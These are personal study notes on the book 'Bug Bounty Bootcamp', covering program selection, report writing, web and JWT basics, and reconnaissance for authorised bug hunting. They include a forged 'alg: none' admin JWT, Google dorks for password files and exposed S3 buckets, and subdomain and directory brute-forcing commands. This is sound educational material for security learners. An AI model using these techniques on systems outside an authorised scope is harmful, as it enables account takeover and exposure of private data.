# Bug Bounty Bootcamp - Vickie Li

## Table of Contents

- [Chapter 1: Picking a Bug Bounty Program](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-1-picking-a-bug-bounty-program)
- [Chapter 2: Sustaining Your Success](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-2-sustaining-your-success)
- [Chapter 3: How the Internet Works](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-3-how-the-internet-works)
- [Chapter 4: Environmental Setup and Traffic Interception](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#environmental-setup-and-traffic-interception)
- [Chapter 5: Web Hacking Reconnaissance](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance)
  - [Google Dorking](https://github.com/Xerips/BookNotes/blob/main/BugBugBountyBootcamp.md#google-dorking)
  - [Scope Discovery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#scope-discovery)
  - [Writing Your Own Recon Scripts](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#writing-your-own-recon-scripts)
- [Chapter 6: Cross-Site Scripting](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#cross-site-scripting)
- [Chapter 7: Open Redirects](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-7-open-redirects)
- [Chapter 8: ClickJacking](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-8-clickjacking)
- [Chapter 9: Cross-Site Request Forgery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-9-cross-site-request-forgery)
- [Chapter 10: Insecure Direct Object References (IDORs)](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-10-insecure-direct-object-references-idors)
- [Chapter 11: SQL Injection](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-11-sql-injection)
- [Chapter 12: Race Conditions](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-12-race-conditions)
- [Chapter 13: Server-Side Request Forgery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-13-server-side-request-forgery)
- [Chapter 14: Insecure Deserialization](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-14-insecure-deserialization)
- [Chapter 15: XML External Entity](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-15-xml-external-entity)
- [Chapter 16: Template Injection](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-16-template-injection)
- [Chapter 17: Application Logic Errors and Broken Access Control](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-17-application-logic-errors-and-broken-access-control)
- [Chapter 18: Remote Code Execution](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-18-remote-code-execution)
- [Chapter 19: Same-Origin Policy Vulnerabilities](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-19-same-origin-policy-vulnerabilities)
- [Chapter 20: Single-Sign-On Security Issues](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-20-single-sign-on-security-issues)

### Chapter 1: Picking a Bug Bounty Program

Programs: HackerOne, Bugcrowd, Synack, Cobalt, Intigriti  
History: [Bug Bounty Programs](https://en.wikipedia.org/wiki/Bug_bounty_program)

**Assets:**  
Asset = An application, website, or product that you can hac.  
Pick a program that has assets that play to your strengths, based on your skill set, experience level, and preferences

**Asset Types:**

- **Social Sites and Applications:**

  - Any website where users interact with each other.
  - A lot of potential vulnerabilities due to complexity, high level of user interaction between users and the server
  - Examples: Facebook, Twitter, Github, LINE, Discord
  - Weaknesses:
    - IDORs (Indirect Object Reverences)
    - Info Leaks (directory busting)
    - Account Take Overs (session hijacking)
    - Input validation (SQLi, XSS)
    - Large attack surface
  - Skills Needed:
    - Burpsuite/proxy usage
    - XSS
    - IDOR
    - Useful: JavaScript
  - Downside:
    - Highly targeted
    - Competitive

- **General Web Applications:**

  - Any web application that does not involve user-to-user interaction
  - Users interacts with the server to access application features
  - Low barrier to entry
  - Vary in popularity
  - Examples: Static Websites, Cloud Applications, Consumer Services (Banks, IoT web portals), Google, USDoD, Credit Karma
  - Skills Needed:
    - Server-side vulnerabilities
    - Vulnerabilities specific to the applications tech stack
    - Network vulnerabilities (Subdomain takeovers)
    - Proxy usage
    - Client-side vulnerabilities
    - Useful: Web development, programming
  - Downside:
    - Harder to hack than social Applications
    - Smaller attack surface

- **Mobile Applications (Android, iOS, and Windows):**

  - Specialize in mobile apps only after becoming proficient in hacking web applications
  - Examples: Facebook Messenger, Twitter (X) app, LINE mobile app, Yelp app, Gmail app.
  - Less popular among bug county hunters, less competitive.
  - Skills Needed:
    - Web App hacking
    - Knowledge of structure and programming techniques related to the platform (Android, iOS, Windows, etc.)
    - Attacks and Analysis strategies related to the platform (Certificate pinning bypass, mobile reverse engineering, cryptography)
    - Mobile testing lab setup (Regular device, rooted device, device emulator)
  - Downside:
    - Higher barrier to entry for skill set
    - Higher barrier to entry for equipment/lab setup

- **APIs (Application Programming Interface)**

  - Skills Needed:
    - Web application hacking
    - Mobile app hacking
    - IoT hacking
    - Data leaks
    - Injection flaws

- **Source Code and Executables:**

  - Less competitive, a very small pool of hackers working on these
  - An abundance or type and difficulty
  - Examples: Internet Bug Bounty, PHP language, the WordPress program
  - Skills Needed:
    - Advanced programming
    - Advanced reverse engineering
    - Source code analysis
    - Binary fuzzing
    - Web vulnerabilities
    - Cryptography
    - Software development
  - You don't have to be a master programmer, requires solid understanding of the project's tech stack and architecture

- **Hardware and IoT:**
  - Programs often provide free device to hack
  - Often need a pre-existing relationship with the company
  - The least competitive due to specialized skill set and device access
  - Examples: Cars, Televisions, thermostats, Tesla, Ford
  - Skills Needed:
    - Highly specific to the assets
    - Common IoT vulnerabilities
    - Web vulnerabilities
    - Programming
    - Code analysis
    - Reverse engineering
    - IoT concepts
    - Digital signing
    - Asymmetric encryption schemes
    - Cryptography
    - Wireless hacking
    - Software Development (useful)
  - Downside:
    - Higher skill set barrier to entry
    - May need the money to buy the device(s)

**Bug Bounty Platforms**

- Hosted in two ways:

  1. Bug bounty platform

  - Pros:
    - Transparency into companies
      - Company's process for dealing with reports
      - Disclosed reports
      - Metrics about triage rates, payment amounts, response times
    - Often have reputation systems to showcase experience and gain access to invite-only programs
    - More seamless communication with asset owners
    - Easier to follow up on reports
    - Payment and tax info every time you wubmit a vuln report
    - Bug bounty platforms often step in to provide conflict resolution and legal protection as a third party (getting paid, staying protected)
    - Hacker-to-hacker feedback from platforms is helpful in selecting assets
  - Cons:
    - Reports often get handled by _triagers_ who are often less familiar with a company's products security details (unskilled hackers)
      - Complaints about triagers handling reports improperly are common
    - Platforms break the direct connection between hackers and developers
    - Often more crowded than private bug bounty programs

  2. Independently hosted website

  - Often have direct access to discuss vulnerabilities with security engineers, very valuable learning/networking experience
  - Not a lot of recourse if things go wrong

**Scope, Payouts, and Response Times**

**Program Scope:**

- Defines what and how you are allowed to hack
- Two types of scope:
  1. Asset
  - Which Subdomain
  - Which Products
  - Which Applications
  2. Vulnerability
  - Which vulnerabilities the company will accept as valid bugs
    **Hacking an out-of-scope asset is illegal!!**
- Finding assets with a large scope is a great place for beginners to start
  - The larger the scope, the larger the number of target applications and web pages you can look at
  - Can often find obscure applications that are overlooked by other hackers

**Payout Amounts:**

- VDPs (Vulnerability Disclosure Programs)
  - Reputation only (no payment)
  - Great for learning if you don't need money right away
  - Less competitive, easier to find bugs
  - Still can offer interaction with security engineers for learning/networking
- Bug Bounty Programs
  - Pay per Vulnerability
  - The more critical the vulnerability, the higher the payment
  - low-impact ~$50-$500
  - Critical issues $10,000+
    - This has been increasing over time
    - Apple pays up to $1,000,000 for more sever vulnerabilities

**Response Time:**

- Prioritize programs that have fast response times
  - As a beginning you will make mistakes and having fast response times helps to be able to learn and move on as soon as possible

**Private Programs**

- Open to invited hackers only
- Hackers are selected based on skill set, track record, reputation, etc.
- Much less competitive once in
- Not incredibly difficult to get private invites once you've found a few bugs.
- Tips:
  - Submit a few bugs to public programs
  - Focus on increasing reputation points
  - Go for the highest impact bugs, chain low impact bugs to escalate
  - HackerOne: complete tutorials and solve Capture the Flag challenges
  - Don't spam
  - Be polite and courteous when dealing with security teams

**Choosing the Right Program**

- Pick a program you can succeed in from the start
  - Pick programs that more experience bug hunters pass over to avoid competition
  - Look for unpaid programs or go for programs with BIG scopes
  - Start with VDPs move to large scope increase rep for private invites
  - Dig into the company's process through disclosed Reports
    - Does the company treat its reporters well?
    - Are they respectful and supportive?
    - Do they help you learn?

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 2: Sustaining Your Success

1. Craft a Descriptive Title

- Aim for a one sentence title that sums up the issue.
- Things to consider for the title:
  - What the vulnerability is
  - Where it occurred
  - The potential severity
- Example:
  - Instead of "IDOR on Critical Endpoint"
  - "IDOR on https://example.com/change_password Leads to Account Takeover for All Users."

2. Provide a Clear Summary

- Should contain all of the information you couldn't fit in the title
  - example:
    `The https://example.com/change_password endpoint takes two POST body parameters: user_id and new_password. A Post request to this endpoint would change the password of user_id to new_password. This endpoint is not validating the user_id parameter, and as a result, any user can change anyone else's password by manipulating the user_id parameter.`

3. Include a Severity Assessment

- Ratings should be given in one line:
  - "Severity of the issue: High"
- Don't over or under state the severity
- Severity Rankings:

  - Low: The bug doesn't have the potential to cause a lot of damage. For example, an open redirect that can be used only for phishing is a low-severity bug.
  - Medium: The bug impacts users or the organization in a moderate way, or is a high-severity issue that's difficult for a malicious hacker to exploit. The security team should focus on high- and critical-severity bugs first. For example, a cross-site request forgery (CSRF) on a sensitive action such as password change is often considered a medium-severity issue.
  - High: The bug impacts a large number of users, and its consequences can be disastrous for these users. The security team should fix a high-severity bug as soon as possible. For example, an open redirect that can be used to steal OAuth tokens is a high-severity bug.
  - Critical: The bug impacts a majority of the user base or endagers the organization's core infrastructure. The security team should fix a critical-severity bug right away. For example, a SQL injection leading to remote code execution (RCE) on the production server will be considered a critical issue.

- Resources for researching severity:
  - [Common Vulnerability Scoring System (CVSS)](https://www.first.org/cvss)
  - [Bugcrowd's rating system](https://bugcrowd.com/vulnerability-rating-taxonomy)
  - [HackerOne](https://docs.hackerone.com/hackers/severity.html)

4. Give Clear Steps to Reproduce

- Bad Example:

1. Login to the site and visit https://example.com/change_password
2. Click the Change Password button
3. Intercept the request, and change the user_id parameter to another user's ID.

- Better Example:

1. Make two accounts on example.com: account A and account B.
2. Log in to example.com as account A, and visit https://example.comd/change_password
3. Fill in the desired new password in the new password field, located at the top left of the page.
4. Click the Change Password button located at the top right of the page
5. Intercept the POST request to https://example.com/change_password and change the user_id POST parameter to the user ID of account B.
6. You can now log in to account B by using the new password you've chosen.`

7. Provide a Proof of Concept

- The steps to reproduce may be sufficient for some bugs
- When bugs are more complex it may be helpful to include video, screenshots, or photos documenting your exploit in a POC file
- Examples:
  - Include an HTML file with the CSRF payload embedded. This way the only thing the security team needs to do is to open the HTML file in their browser.
  - For an XML external entity attack, include the crafted CML file that you used to execute the attack
  - For a vulnerability that requires multiple steps to reproduce, provide a screen capture of you walking through the process
  - Saving the security team time by providing payloads will help turn around time and help build a relationship
  - Provide any files, exploits, scripts, or upload files used in the exploit is best practice

6. Describe the Impact and Attack Scenarios

- The severity assessment (CVSS) describes the severity of the consequences of an attacker exploiting the vulnerability, whereas the attack scenario explains what those consequences would actually look like.
- Example:
  - `Using this vulnerability, all that an attacker needs in order to change a user's password is their user_id. Since each user's public profile page lists the account's user_id, anyone can visit any user's profile, find out their user_id, and change their password. And because user_ids are simply sequential numbers, a hacker can even enumerate all the user_ids and change the passwords of all users! This bug will let attackers take over anyone's account with minimal effort.`
  - The Impact section should take into account any mitigating factors as well as the maximum impact that can be achieved
  - It should never overstate a bug's impact or include any hypotheticals

7. Recommend Possible Mitigations

- Only provide possible mitigations if you can be clear and confident in explaining them
- If you're unsure avoid giving suggestions to avoid confusing the security team
- Example:
  - `The application should validate the user's user_id parameter within the change password request to ensure that the user is authorized to make account modifications. Unauthorized request should be rejected and logged by the application`

8. Validate the Report

- Proof read the report
- Recreate the bug by following your report
- Ensure all POC files are correct

#### **Understanding Why You're Failing**

**You participate in the Wrong Programs**

- Read publicly disclosed reports, analyze program statistics on bug bounty platforms, or talk with other hackers
  - You may be working with a company that is difficult or only lists on bug bounty platforms for publicity and don't intend to use the service
- Avoid programs with long response times and programs with low average bounties
- Pick targets carefully and prioritize companies that invest in their bug bounty Programs

**You Don't Stick to a program**

- Dig deep or search wide
  - dig deep into a single function of an application
  - search wide to find lesser known assets of the company

**You Don't Recon**

- Recon with the idea of finding new attack surfaces: new subdomains, new endpoints, and new functionality
- Finding buried treasure is a great way to avoid duplicates or competition

**You go for Only Low-Hanging Fruit**

- Using vulnerability scanners can be pretty useless. Both other hackers and the company themselves will be using vuln scanners too.
- Simplistic bugs have usually already been reported on big projects. This is because many of them have been private before they go public.
- Should still look for low-hanging fruit, but don't be discouraged or stop when you don't find anything

**You don't get into private programs**

- Most bug bounty hunters report gaining most of their rewards through private programs. Make sure you respond!

#### **What to Do When You're Stuck**

1. Take a Break!
2. Build Your Skill Set

- [OWASP](https://owasp.org/www-project-web-security-testing-guide) has testing guides that can help you build your skills towards what's most common
- Play CTFs

3. Gain a Fresh Perspective

- Diversify your targets to break up the monotony
- Look for specific things, when whose don't work, look for other specific things

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 3: How the Internet Works

**The Client-Server Model**

- The internet is composed of two kinds of devices: Clients and Servers.
  - Clients request resources
  - Servers provide resources
- Web servers provide:
  - HTML files to your browser to display information
  - CSS files to make that display information pretty
  - JavaScript to which enables animation, reacts to use input, resizing of of images as you scroll, validation of user input on the client side all before interacting with the server. JavaScript can also display images and videos
  - Web APIs enable applications to request the data of other systems

**The Domain Name System (DNS)**

- Functions as the phone book for the internet by translating domain names into IP addresses.  
  Example:  
   Browser -- "Where is google.com?" --> DNS server  
   DNS server -- "It's at 216.58.192.132" --> Browser  
   Browser -- "Show me google.com" --> Web Server 216.58.192.132  
   Web Server 216.58.192.132 -- "here you go, google.com" --> Browser

  **Internet Ports**

- You connect to a server through a port which range in number from 0 to 65,535
- Users connect to a server through a port which is mapped to a specific service
  - This makes sending and receiving information more efficient as conventions allows for this information to all be processed in the same way
  <pre>
  Example:                  port 80 - HTTP service  
                          /  
  browser --> web server -- port 25 - Email service  
                          \  
                            port 21 - ftp service  
  </pre>

**Requests and Responses**

- HTTP is a set of rules that specifies how to structure and interpret internet messages and how web clients and web servers should exchange info
- Types of HTTP requests:
  - GET: Retrieves information from the server
  - POST: Submits data to the server
  - OPTIONS: Requests permitted HTTP methods
  - PUT: Used to update a resource
  - DELETE: Used to delete a resource
- Examples of very simple HTTP requests and responses on page 36-37 (simplistic)

#### **Internet Security Controls**

**Content Encoding**

- Data encoding is not just used to privacy or security, it is also used to prevent data corruption
- Used to transfer binary data reliably across machines that have limited support for different content types
- When you transfer data without encoding, data may be screwed up when the internet protocols misinterpret special characters in the message
- Common Data Encoding methods:
  - Base64
  - Hex
  - URL encoding
  - Octal encoding
  - dword encoding
  - Whenever you see encoded data try to decode it to understand what the website is trying to communicate
- Tools for encoding/decoding:
  - Burpsuite
  - [Cyber Chef](https://gchq.github.io/CyberChef)
- When servers encrypt their content before transmission, the data between the client and server is secured against intercepts and eavesdropping

**Session Management and HTTP Cookies**

- Session management is the process that allows the server to handle multiple requests from the same user without asking the user to log in again
- When you log in, the server creates a new session and assigns an associated session ID to your browser that serves as proof of identity
  - Session ID's are often long and unguessable
- When you log out, the server ends the session and revokes the session ID. Session ID's may also be ended if you don't manually logout (timeout)
- Most websites use cookies to communicate session information in HTTP Requests
  - These cookies are stored in your browser
- When you log in later, a new session ID is created and sent to your browser

**Token-Based Authentication**

- Token-based authentication systems store your session ID info directly in some sort of token.
  - Instead of storing your information server-side and querying it using a session ID, tokens allow servers to deduce your identity be decoding the token itself.
  - This way applications won't have to store and maintain session information server-side
- **Risk:** If the server uses information contained in the token to determine the user's identity, couldn't users modify the information in the tokens and log in as someone else?
  - To combat token forgery, applications might encrypt their tokens, or encode the token so that it can be read by only the application itself or other authorized parties
  - This does not completely eliminate the risk of token forgery. It's harder but attackers can tamper with encrypted tokens without understanding the contents. Encoded tokens can also be decoded to read the contents
  - Signing tokens is a more reliable way to prevent token tampering as only the system with the secret signing key can generate the signature
    Example:

1. The user logs in with their credentials.
2. The server validates those credentials and provides the user with a signed token.
3. The user sends the token with every request to prove their identity.
4. Upon receiving and validating the token, the server reads the user's identity information from the token and responds with confidential data.

**JSON Web Tokens**

- JSON web token is one of the most commonly used types of authentication tokens and it has three components:
  1. A header:
  - Identifies the algorithm used to generate the signature
  - It's a base64url-encoded string containing the algorithm name
  - ex. eyBhbGcgOiBIUzI1NiwgdH1wIDogSldUIH0K
  - ex. decoded: { "alg" : "HS256", "typ" : "JWT" }
  2. A payload:
  - Contains information about the user's identity
  - It's a base64url-encoded string containing the algorithm name
  - ex. eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg
  - ex. decoded: { "user_name" : "admin", },
  3. A signature
  - Calculated by concatenating the header with the payload, then signing it with the algorithm specified in the header, and a secret key
  - ex. 4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M
  - Created by signing: eyBhbGcgOiBIUzI1NiwgdH1wIDogSldUIH0K.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg with HS256 algorithm using the secret key
  - The whole token is made up of each part separated by a period: eyBhbGcgOiBIUzI1NiwgdH1wIDogSldUIH0K.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg.4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M
  - If done incorrectly, there are ways to bypass the security mechanism and forge arbitrary Tokens

**Manipulating the alg Field**

- Sometimes applications fail to verify a token's signature after it arrives at the server allowing an attacker to bypass the security mechanism by providing an invalid or blank signature
- Attackers do this by tampering with the "alg" field of the token header
  - Applications must restrict the algorithm type used in the JWT to stop attackers from compromising the security of the token through tampering with the "alg" field
  - If the alg field is able to be set to `none` even tokens with empty signature sections would be considered valid
  - example:
    - { "alg" : "none", "typ" : "JWT" } { "user_name" : "admin" }
    - = eyAiYWxnIiA6ICJub25lIiwgInR5cCIgOiAiSldUIiB9.eyAidXNlcl9uYW1lIiA6ICJhZG1pbiIgKQ.
- Allowing the alg field to be set to `none` was originally used for debugging, but if left on attackers can bypass security and log in as anyone
- HMAC and RSA are the most popular signing algorithms
  - If an RSA algo is being used, and the attacker can switch the "alg" field to HMAC, they might be able to create valid tokens by signing the forged tokens with the RSA public key
    - When the field is switched to HMAC the token is still verified with the RSA public key, but this time, they token can be signed with the same public key.

**Brute-Forcing the key**

- Attackers have a lot of information to start with: the algorithm used to sign the token, the payload that was signed, and the resulting signature
- If the key used to sign the token is not complex enough, it might be possible to brute-force it
- If another vulnerability exists (Directory Traversal, external entity attack (XXE), or server side request forgery (SSRF)) that allows the attacker to read the file where the key value is stored, the attacker can steal the key and sign arbitrary tokens of their choosing

**Reading Sensitive Information**

- JWT's often contain sensitive user information, if they aren't encrypted attackers can decode them to access sensative user information
- Properly implemented signature sections provide data integrity, not confidentiality
- Search JWT security issues or vulnerabilities for more examples

**The Same-Origin Policy**

- Same-Origin Policy (SOP) is a rule that restricts how a script from one origin can interact with the resources of a different origin.
  - A script from page A can access data from page B only if the pages are of the same origin
  - This rule protects modern web applications and prevents many common web vulnerabilities
- Two URLs are said to have the same origin if they share the same protocol, hostname, and port number

**Learn to program**

- Learning python or bash can help you automate repetitive tasks and safe lots of time
- Learning to read JavaScript can help you find hidden endpoints that may be vulnerable
- Recommended books:
  - _Learn Python the Hard Way_ by Zed Shaw
  - _Eloquent JavaScript, Third Edition_ by Marijn Haverbeke

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 4: Environmental Setup and Traffic Interception

The setup section is very basic and only necessary if you've never used BurpSuite and don't have a setup for pen testing already.

**A Final Note on... Taking Notes**

- Stay organized
- Keep track of what you've tested and what you've yet to test (regardless of success)
  - Don't waste your time accidentally testing the same things
- Record details about each vulnerability:
  - theoretical concept, potential impact, exploitation steps, and sample proof-of-concept code
- Possible note taking tech:
  - Obsidian (Mark down, brain mapping)
  - XMind (mind mapping tool)
  - \*CherryTree (hierarchical note taking, good for searching through your notes and building large note bases)
  - \*NeoVim (Cuz why not? I use it for everything else)
- Note taking tips:
  - Take notes about any weird behaviors, new features, misconfigurations, minor bugs, and suspicious endpoints to keep track of potential vulnerabilities
  - Take notes to keep track of your hacking progress, the features you've tested, and those you stil have to check
  - Take notes while you learn: jot down information about each vulnerability you learn about, like its theoretical concept, potential impact, exploitation steps, and sample POC code.
  - Keep you notes organized from the get-go, so you can find them when you need to!
  - Find a note-taking and organization process that works for you, You can try out note-taking tools like Sublime Text, Obsidian, and XMind to find a tool that you prefer.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 5: Web Hacking Reconnaissance

**Manually Walking Through the Target**

- Try to use every function the website has to offer: payments, events, create different users with different privileges, click all the links and see where they go, etc.
- You're exploring the attack surface

#### Google Dorking

- Advanced google searches are a powerful technique to find the resources you need quickly and accurately.
- Can be used for recon or finding POCs, Payloads, etc.
- Can be used for finding hidden admin portals, unlocked password files, and leaked authentication keys.

**Google Dorking Operators:**

- **_site_**:
  - Tells Google to show you results from a certain site only.
  - ex.: to show results for print() only from python.org
    - print() site:python.org
- **_inurl_**:

  - Searches for pages with a URL that match the search string.
  - ex.: You've just learned that "/course/jumpto.php" could indicate that a site is vulnerable to RCE.
    - You can then search: inurl:"/course/jumpto.php" site:example.com
  - ex.: Search for possibly vulnerable endpoints like a Kibana dashboard:
    - site:example.com inurl:app/kibana

- **_intitle_**:
  - Finds specific strings in a page's title.
  - ex.: You want to search for file-listing pages on a web server and know that they often have "index of" in their titles.
    - intitle:"index of" site:example.com
- **_link_**:
  - Searches for web pages that contain links to a specified URL.
  - ex.: You're researching the common regular expression denial-of-service (ReDos) vulnerability. You can easily pull up its definition but might have a hard time finding examples. The link operator can discover pages that reference the vulnerability's Wikipedia page to find discussions on the topic
    - link:"https://en.wikipedia.org/wiki/ReDos"
- **_filetype_**
  - Searches for pages with a specific file extension. Use it to find files with extensions like .log, .php, .pwd, etc.
    - filetype:log site:example.com
- **_Wildcard(\*)_**
  - Used to indicate "Any character or series of characters."
  - ex.: Replace a word in a search to find all possible matches that could replace that word.
    - "How to hack \* using Google"
    - This will result in results like: "How to hack _websites_ using Google," "How to hack web apps using Google," "How to hack (ext.) using Google."
  - ex. Search for all of a targets sub domains:
    - site:\*.example.com
- **_Quotes (" ")_**
  - Adding quotations around your search terms forces an exact match.
  - ex.: Force searches to contain all the words "How to hack," by putting them in quotes.
    - This will not guarantee that the words will be in the order of your quoted text.
- **_Or (|)_**
  - Pipe character = "or"
  - | must be surrounded by spaces
  - ex.: Search for "how to hack" on two different sites:
    - "how to hack" site:(reddit.com | stackoverflow.com)
  - ex.: Search for results containing either SQLi or SQL injection:
    - (SQLi | SQL injection)
- **_Minus (-)_**
  - Used to exclude search results
  - ex.: You want to search "how to hack" but exclude php hacking:
    - "how to hack websites" -php
- **_ext_**
  - similar to filetype, but will look specifically for file extensions (not file types) like .php, .cfm, .asp, .jsp, .pl
  - ex.:
    - site:example.com ext:php
    - site:example.com ext:txt password

[Google Hacking Database](https://www.exploit-db.com/google-hacking-database/) contains many search queries that could be helpful including queries that look for files containing passwords, common URLs of admin portals, pages build using vulnerable software.
**If you're sending a lot of search queries, Google will start requiring CAPTCHA challenges for visitors from your network. Don't slow down everone else using google on your network, use a VPN/VPS to a different network if you think this may happen.**

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

#### Scope Discovery

Always verify the target's scope which specifies which subdomains, products, and applications you're allowed to attack.  
If dev.example.com and test.example.com are out of scope, manually test around them, or exclude them when using tools that might touch these subdomains.

**WHOIS and Reverse WHOIS**
Use whois to obtain information like: mailing address, phone number, email address, names, etc.

- ex.: whois facebook.com
  For companies using _domain privacy_ you can use a reverse whois for finding more obscure information or internal domains.
- Use ViewDNS.info (or another public tool) for reverse whois
  Between whois and reverse whois you'll have a good set of top-level domains to work with.

**IP Addresses**

- Use nslookup to find the IP address associated with a domain.
  - `$ nslookup facebook.com`
- Use whois with the IP and look for the NetRange to see what range of IP addresses (range) belong to the target. If they have a range, all IP addressed within that range belong to the target.
- You can compare Autonomous System Numbers (ASNs) to see if multiple IPs belong to the same owner as well.
- ex.:
- `whois -h whois.cymru.com 157.240.2.20`
  AS | IP | AS Name  
  32934 | 157.240.2.20 | FACEBOOK, US
- `whois -h whois.cymru.com 157.240.2.27`
  AS | IP | AS Name  
  32934 | 157.240.2.27 | FACEBOOK, US
- The -h flag in the whois command sets the WHOIS server to retrieve information from, and whois.cymru.com is a database that translates IPs to ASNs. If the company has a dedicated IP range, and doesn't mark those addresses as out of scope, you could plan to attack every IP in that range.

**Certificate Parsing**

- An SSL certificate's Subject Alternative Name field allows cert owners to specify additional hostnames that use the same certificate. You can find those hostnames by parsing this field.
- Online Databases: crt.sh, Cert Spotter, Censys
- crt.sh can send information in JSON format, rather than HTML, for easier parsing.
  - For JSON, you can change the request to `curl https://crt.sh/?q=facebook.com&output=json`

**Subdomain Enumeration**
Tools:

- Sublist3r: Works by querying search engines and online subdomain databases.
- SubBrute: Brute-forcing tool that guesses possible subdomains until it finds ones that exist.
- Amass: Uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases.
- Gobuster: Another brute-forcing and fuzzing tool.
- [Altdns](https://github.com/infosec-au/altdns/): Automates the process of discovering subdomains with names that are permutations of other subdomains.
  Wordlists:
- Daniel Miessler's [SecLists](https://github.com/danielmiessler/SecLists/) - Gotta have it, it's extensive and well organized.
- Word list Generation:
  - [Commonspeak2](https://github.com/assetnote/commonspeak2/)
  - [CeWL](https://github.com/digininja/CeWL)
    Tips, Tricks, Usages:
- Use `sort -u wordlist1.txt wordlist2.txt -o hybridlist.txt` to remove duplicate entries in 2 wordlists.
- Gobuster subdomain brute-forcing: `gobuster dns -d target_domain -w wordlist`
- Use knowledge of the target to check for possible subdomains.
  - ex.: you know example.com uses jenkins, check jenkins.example.com to see if it's a valid subdomain.
- look for subdomains of subdomains: found dev.example.com, try also for 1.dev.example.com, etc.
  - recursively check for subdomains by brute forcing your found domains (again and again until no returns).

**Service Enumeration**
Tools:

- nmap: Active Scanning
- masscan: Active Scanning
- Shodan: Passive Scanning
- Censys: Passive Scanning
- Projects Sonar: Passive Scanning

- Active scanning is where your system directly interacts with the target system to check if certain ports are open. Can be seen and you could have your IP address blocked, or logged, etc.
- Passive Scanning is where you use a 3rd party to scan the target. This is a way to get information without touching the target.
- The book doesn't go into it (at least in this chapter), but nmap and masscan have a huge amount of functionality. Take a look at the documentation, tutorials, etc. to help build your own commands to create custom enumeration commands for different targets/scenarios.

**Directory Brute-Forcing**

- dirsearch example:
  - `dirsearch -u scanme.nmap.org -e php`
  - -u is the flag for the url you're dir busting, -e is the file extensions you're looking for. You can run it with multiple file extensions.
- gobuster example:
  - `gobuster dir -u target_url -w wordlist`
  - dir to specify directory busting (in contracts to the earlier dns), -u to specify the target url, -w to pass the wordlist.
    Tips and Tricks:
- Use a screenshot tool like [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness/) or [Snapper](https://github.comdxa4481/Snapper) to automatically verify that a page is hosted on each location
- EyeWitness accepts a list of URLs and takes screenshots of each page. Quickly cycle through images in an image gallery app to see if anything looks interesting.
  - Look for: Developer or Admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained.

**Spidering the Site**

- A web spider tool visits a page, then identifies all the URLs embedded on the page and visits them, then repeats the process.
  - This can uncover hidden endpoints in an application.
    Tools:
- OWASP Zed Attack Proxy (ZAP): Book recommends ZAP for spidering over BurpSuite. Pg. 72 for examples.
- BurpSuite: Uses the "crawler" function to perform spidering/web crawling

**Third-Party Hosting**

- Take a look at the targets third-party hosting footprint.
- Look for S3 buckets (AWS) which stands for Simple Storage Service
  - S3 buckets can contain hidden endpoints, logs, credentials, user information, source code, and other information that might be useful.
- Use Google Dorking
  - `site:s3.amazonaws.com COMPANY_NAME` and
  - `site:amazonaws.com COMPANY_NAME`
  - Naming convention: BUCKET.s3.amazonawes.com or s3.amazonaws.com/BUCKET
  - For targets with custom URLs for S3 buckets:
    - `amazonaws s3 COMPANY_NAME`
    - `amazonaws bucket COMPANY_NAME`
    - `amazonaws COMPANY_NAME`
    - `s3 COMPANY_NAME`
- You can use [GreyhatWarfare](https://buckets.grayhatwarfare.com) to search publicly exposed S3 buckets using a keyword.
  - Supply keywords related to your target, such as the application, project, or organization name, to find relevant buckets.
